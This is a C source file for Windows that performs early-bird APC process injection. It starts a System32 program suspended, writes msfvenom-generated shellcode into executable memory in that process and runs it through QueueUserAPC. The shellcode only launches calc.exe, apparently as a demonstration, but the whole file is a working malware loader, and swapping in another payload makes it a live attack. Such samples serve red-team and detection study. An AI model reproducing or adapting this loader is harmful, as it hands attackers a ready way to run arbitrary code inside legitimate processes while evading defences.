#include <windows.h>
#include <stdio.h>

// Function to create a suspended process
BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD *dwProcessId, HANDLE *hProcess, HANDLE *hThread)
{
    // Declare and initialize variables for path and process information
    CHAR lpPath[MAX_PATH * 2];
    CHAR winDir[MAX_PATH];
    STARTUPINFOA Si = {0};
    PROCESS_INFORMATION Pi = {0};

    // Set the size of the STARTUPINFO structure
    Si.cb = sizeof(STARTUPINFO);

    // Retrieve the %WINDIR% environment variable path
    if (!GetEnvironmentVariableA("WINDIR", winDir, MAX_PATH))
    {
        printf("[!] GetEnvironmentVariableA failed with error: %d \n", GetLastError());
        return FALSE;
    }

    // Construct the target process path
    sprintf_s(lpPath, sizeof(lpPath), "%s\\System32\\%s", winDir, lpProcessName);
    printf("\n\t[i] Running: \"%s\"...", lpPath);

    // Create the suspended process
    if (!CreateProcessA(
            NULL,
            lpPath,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &Si,
            &Pi))
    {
        printf("[!] CreateProcessA failed with error: %d \n", GetLastError());
        return FALSE;
    }

    printf("[+] Done.\n");

    // Assign the process and thread information to the output parameters
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // Check if process and thread handles were successfully obtained
    if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

int main(int argc, char *argv[])
{
    // Show usage
    if (argc != 2)
    {
        printf("Usage: %s <ProcessName>\n", argv[0]);
        return 1;
    }

    //  Define variables for PID, process handle, and thread handle
    DWORD dwProcessId;
    HANDLE hProcess;
    HANDLE hThread;

    // Call CreateSuspendedProcess function with the provided process name
    BOOL result = CreateSuspendedProcess(argv[1], &dwProcessId, &hProcess, &hThread);

    // Shellcode that pops calc.exe
    // msfvenom -p windows/x64/exec CMD=calc.exe -f c
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
    SIZE_T shellSize = sizeof(buf);

    if (result)
    {
        printf("Process created successfully with PID: %u\n", dwProcessId);

        // Allocate executable memory in the target process for the shellcode
        LPVOID shellAddress = VirtualAllocEx(hProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        // Set a function pointer to the allocated memory
        PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

        // Write the shellcode to the target process memory
        WriteProcessMemory(hProcess, shellAddress, buf, shellSize, NULL);

        // Queue an APC to execute the shellcode in the target thread
        QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);

        // Resume the suspended process
        ResumeThread(hThread);

        // Close process and thread handles
        CloseHandle(hProcess);
        CloseHandle(hThread);
    }
    else
    {
        printf("Failed to create the process.\n");
    }

    return 0;
}
